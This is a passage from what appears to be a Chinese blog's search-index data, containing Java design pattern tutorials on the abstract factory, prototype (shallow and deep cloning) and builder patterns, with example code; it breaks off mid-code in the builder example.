class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">Coat</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Clothes</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">Trousers</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Clothes</span>&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SpringCoat</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Coat</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">coth</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;春天的上衣&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SummerCoat</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Coat</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">coth</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;夏天的上衣&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SpringTrousers</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Trousers</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">coth</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;春天的裤子&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SummerTrousers</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Trousers</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">coth</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;夏天的裤子&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">SeaconFactory</span>&#123;</span><br><span class=\"line\">    Clothes <span class=\"title function_\">createCoat</span><span class=\"params\">()</span>;</span><br><span class=\"line\">    Clothes <span class=\"title function_\">createTrousers</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SpringFactory</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">SeaconFactory</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Clothes <span class=\"title function_\">createCoat</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Clothes</span> <span class=\"variable\">coat</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SpringCoat</span>();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;创建：&quot;</span> + coat.getClass().getSimpleName());</span><br><span class=\"line\">        <span class=\"comment\">//do some thing</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> coat;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Clothes <span class=\"title function_\">createTrousers</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Clothes</span> <span class=\"variable\">trousers</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SpringTrousers</span>();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;创建：&quot;</span> + trousers.getClass().getSimpleName());</span><br><span class=\"line\">        <span class=\"comment\">//do some thing</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> trousers;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SummerFactory</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">SeaconFactory</span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Clothes <span class=\"title function_\">createCoat</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Clothes</span> <span class=\"variable\">clothes</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SummerCoat</span>();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;创建：&quot;</span> + clothes.getClass().getSimpleName());</span><br><span class=\"line\">        <span class=\"comment\">//do some thing</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> clothes;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Clothes <span class=\"title function_\">createTrousers</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Clothes</span> <span class=\"variable\">clothes</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SummerTrousers</span>();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;创建：&quot;</span> + clothes.getClass().getSimpleName());</span><br><span class=\"line\">        <span class=\"comment\">//do some thing</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> clothes;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n在范例中，如果要创建夏天的一套衣服，直接使用SummerFactory创建上衣和裤子就可以，这样的话身上一套就是夏天的装扮，避免因为出现混搭而出现问题。在实际生活中，电脑主板和CPU的针脚是需要对应，可以使用该抽象方法，避免组别和CUP针脚对不上。</li>\n</ul>\n<h3 id=\"抽象工厂模式优点\"><a href=\"#抽象工厂模式优点\" class=\"headerlink\" title=\"抽象工厂模式优点\"></a>抽象工厂模式优点</h3><ol>\n<li>一个工厂车间一系列相关相互依赖的对象，避免出现混合。</li>\n<li>新增产品族时，无需修改系统，比如冬天的衣服。符合“开闭原则”。</li>\n</ol>\n<h3 id=\"抽象工厂模式缺点\"><a href=\"#抽象工厂模式缺点\" class=\"headerlink\" title=\"抽象工厂模式缺点\"></a>抽象工厂模式缺点</h3><ol>\n<li>新增产品的时候比较麻烦，比如新增鞋子。</li>\n</ol>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>抽象工厂是在工厂方法模式上的增强，一个工厂类可以创建多个产品。</p>\n","categories":["设计模式"],"tags":["设计模式","抽象工厂","Abstract Factory Pattern"]},{"title":"Java设计模式-原型模式（Prototype Pattern）","url":"/2017/09/14/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F%EF%BC%88Prototype-Pattern%EF%BC%89/","content":"<h3 id=\"原型模式\"><a href=\"#原型模式\" class=\"headerlink\" title=\"原型模式\"></a>原型模式</h3><blockquote>\n<p>原型模式要求对象实现一个可以“克隆”自身的接口，这样就可以通过复制一个实例对象本身来创建一个新的实例。这样一来，通过原型实例创建新的对象，就不再需要关心这个实例本身的类型，只要实现了克隆自身的方法，就可以通过这个方法来获取新的对象，而无须再去通过new来创建。</p>\n</blockquote>\n<p>原型模式相对于工厂模式而言，本身就是一个工厂，不同的是，工厂模式是直接创建一个新实例，而原型模式是克隆本身实例生成一个相似而完全不同的新实例，在内存中拥有新的地址，且每个克隆对象都是相互独立的。</p>\n<span id=\"more\"></span>\n<p>Java实例代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ConcretePrototype</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Cloneable</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">int</span> age;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> List&lt;String&gt; list;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">ConcretePrototype</span><span class=\"params\">(String name, Integer age, List&lt;String&gt; list)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.list = list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">getName</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setName</span><span class=\"params\">(String name)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Integer <span class=\"title function_\">getAge</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> age;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setAge</span><span class=\"params\">(Integer age)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> List&lt;String&gt; <span class=\"title function_\">getList</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setList</span><span class=\"params\">(List&lt;String&gt; list)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.list = list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 克隆</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> ConcretePrototype <span class=\"title function_\">clone</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">clone</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//object中的clone</span></span><br><span class=\"line\">            clone = <span class=\"built_in\">super</span>.clone();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (CloneNotSupportedException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (ConcretePrototype) clone;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class=\"line\">        <span class=\"type\">ConcretePrototype</span> <span class=\"variable\">concretePrototype</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ConcretePrototype</span>(<span class=\"string\">&quot;whh&quot;</span>, <span class=\"number\">1</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;());</span><br><span class=\"line\">        <span class=\"type\">ConcretePrototype</span> <span class=\"variable\">clone</span> <span class=\"operator\">=</span> concretePrototype.clone();</span><br><span class=\"line\">        System.out.println(clone == concretePrototype);<span class=\"comment\">//false</span></span><br><span class=\"line\">        System.out.println(clone.getName()==(clone.getName()));<span class=\"comment\">//true</span></span><br><span class=\"line\">        System.out.println(clone.getAge()==(clone.getAge()));<span class=\"comment\">//true</span></span><br><span class=\"line\">        System.out.println(clone.getList()==(clone.getList()));<span class=\"comment\">//true</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>代码中使用的Object中的clone方法，对象必须实现Cloneable接口，接口Cloneable的作用在于，在运行期间通知Java虚拟机安全的在这个类上使用clone方法，通过调用clone方法得到当前对象的复制。如果没有实现Cloneable接口，在运行期间会抛出CloneNotSupportedException。</p>\n<p>克隆需要满足的条件有：</p>\n<ol>\n<li>对任何对象都有x.clone() !&#x3D; x</li>\n<li>x.clone().getClass() &#x3D;&#x3D; x.getClass()</li>\n<li>如果对象的equals方法定义恰当，x.clone().equals(x)为true</li>\n</ol>\n<h3 id=\"浅克隆、深克隆\"><a href=\"#浅克隆、深克隆\" class=\"headerlink\" title=\"浅克隆、深克隆\"></a>浅克隆、深克隆</h3><p>对于浅克隆：</p>\n<blockquote>\n<p>被复制对象的所有变量都含有与原来的对象相同的值，而所有的对其他对象的引用仍然指向原来的对象。换言之，浅复制仅仅复制所考虑的对象，而不复制它所引用的对象。</p>\n</blockquote>\n<p>上面的例子中，属性的判断都为true</p>\n<p>对于深克隆：</p>\n<blockquote>\n<p>被复制对象的所有变量都含有与原来的对象相同的值，除去那些引用其他对象的变量。那些引用其他对象的变量将指向被复制过的新对象，而不再是原有的那些被引用的对象。换言之，深复制把要复制的对象所引用的对象都复制了一遍。</p>\n</blockquote>\n<p>解决深度克隆可以使用Java中序列化。如：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ConcretePrototype</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Cloneable</span>, Serializable &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">int</span> age;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> List&lt;String&gt; list;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">ConcretePrototype</span><span class=\"params\">(String name, Integer age, List&lt;String&gt; list)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.list = list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">getName</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setName</span><span class=\"params\">(String name)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Integer <span class=\"title function_\">getAge</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> age;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setAge</span><span class=\"params\">(Integer age)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> List&lt;String&gt; <span class=\"title function_\">getList</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setList</span><span class=\"params\">(List&lt;String&gt; list)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.list = list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 克隆</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> ConcretePrototype <span class=\"title function_\">clone</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">clone</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//object中的clone</span></span><br><span class=\"line\">            clone = <span class=\"built_in\">super</span>.clone();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (CloneNotSupportedException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (ConcretePrototype) clone;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 深克隆</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> ConcretePrototype <span class=\"title function_\">deepClone</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">ConcretePrototype</span> <span class=\"variable\">concretePrototype</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">inputStream</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">ByteArrayOutputStream</span> <span class=\"variable\">byteArrayOutputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ByteArrayOutputStream</span>();</span><br><span class=\"line\">            outputStream = <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class=\"line\">            outputStream.writeObject(<span class=\"built_in\">this</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            inputStream = <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));</span><br><span class=\"line\">            concretePrototype = (ConcretePrototype) inputStream.readObject();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//关闭流</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (outputStream != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    outputStream.close();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (inputStream != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    inputStream.close();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> concretePrototype;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class=\"line\">        <span class=\"type\">ConcretePrototype</span> <span class=\"variable\">concretePrototype</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ConcretePrototype</span>(<span class=\"string\">&quot;whh&quot;</span>, <span class=\"number\">1</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;());</span><br><span class=\"line\">        <span class=\"type\">ConcretePrototype</span> <span class=\"variable\">clone</span> <span class=\"operator\">=</span> concretePrototype.clone();</span><br><span class=\"line\">        System.out.println(clone == concretePrototype);<span class=\"comment\">//false</span></span><br><span class=\"line\">        System.out.println(clone.getName() == (concretePrototype.getName()));<span class=\"comment\">//true</span></span><br><span class=\"line\">        System.out.println(clone.getAge() == (concretePrototype.getAge()));<span class=\"comment\">//true</span></span><br><span class=\"line\">        System.out.println(clone.getList() == (concretePrototype.getList()));<span class=\"comment\">//true</span></span><br><span class=\"line\">        <span class=\"comment\">//深度克隆比较</span></span><br><span class=\"line\">        <span class=\"type\">ConcretePrototype</span> <span class=\"variable\">deepClone</span> <span class=\"operator\">=</span> concretePrototype.deepClone();</span><br><span class=\"line\">        System.out.println(deepClone == concretePrototype);<span class=\"comment\">//false</span></span><br><span class=\"line\">        System.out.println(deepClone.getName() == (concretePrototype.getName()));<span class=\"comment\">//false</span></span><br><span class=\"line\">        System.out.println(deepClone.getAge() == (concretePrototype.getAge()));<span class=\"comment\">//true</span></span><br><span class=\"line\">        System.out.println(deepClone.getList() == (concretePrototype.getList()));<span class=\"comment\">//false</span></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在深度克隆中，克隆的对象与元对象属性比较为false（基本类型比较除外）。深度克隆后生成的对象相对原类型完全独立，对克隆对象的修改，不会影响到原类型。</p>\n<h3 id=\"原型管理器\"><a href=\"#原型管理器\" class=\"headerlink\" title=\"原型管理器\"></a>原型管理器</h3><p>在使用克隆过程中，如果要控制克隆的数量，或者避免重复克隆，可以引入原型管理器，本质就是把克隆对象放入Map中，控制克隆生产和读取即可。在此不做举例。</p>\n<h3 id=\"原型模式总结\"><a href=\"#原型模式总结\" class=\"headerlink\" title=\"原型模式总结\"></a>原型模式总结</h3><p><strong>原型模式优点：</strong><br>在在对象比较复杂时，通过复制一个已有对象，达到快速创建新对象。原型相对工厂而已，创建的是一个和原对象值一样的对象。</p>\n<p><strong>原型模式缺点：</strong><br>如果对象引用了不支持序列化的间接对象，处理相对比较麻烦，在使用深度克隆的时候，如果对象结构比较复杂，序列化和反序列化比较消耗系统资源。</p>\n","categories":["设计模式"],"tags":["设计模式","原型模式","Prototype Pattern"]},{"title":"Java设计模式-建造者模式（Builder Pattern）","url":"/2017/09/14/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F%EF%BC%88Builder-Pattern%EF%BC%89/","content":"<h3 id=\"建造者模式\"><a href=\"#建造者模式\" class=\"headerlink\" title=\"建造者模式\"></a>建造者模式</h3><blockquote>\n<p>创建一个产品时，有时产品有不同的组成成分，在其组成成分没创建完成之前，改产品是不可使用的。使用建造者模式，通过创建所有产品内部零件，组装完成后返回给用户。</p>\n</blockquote>\n<p>例子：<br>举例设计LOL角色，角色包含皮肤、技能、属性、性别<br><img src=\"/images/old/20170914%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-09-14%E4%B8%8B%E5%8D%885.04.14.png\"></p>\n<span id=\"more\"></span>\n<p>Java实现：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 角色</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Actor</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 皮肤</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> String skin;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 技能</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> String skill;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 属性</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> String attribute;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 性别</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> String gender;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">getSkin</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> skin;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setSkin</span><span class=\"params\">(String skin)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.skin = skin;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">getSkill</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> skill;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setSkill</span><span class=\"params\">(String skill)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.skill = skill;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">getAttribute</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> attribute;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setAttribute</span><span class=\"params\">(String attribute)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.attribute = attribute;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">getGender</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> gender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setGender</span><span class=\"params\">(String gender)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.gender = gender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">toString</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Actor&#123;&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;skin=&#x27;&quot;</span> + skin + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span 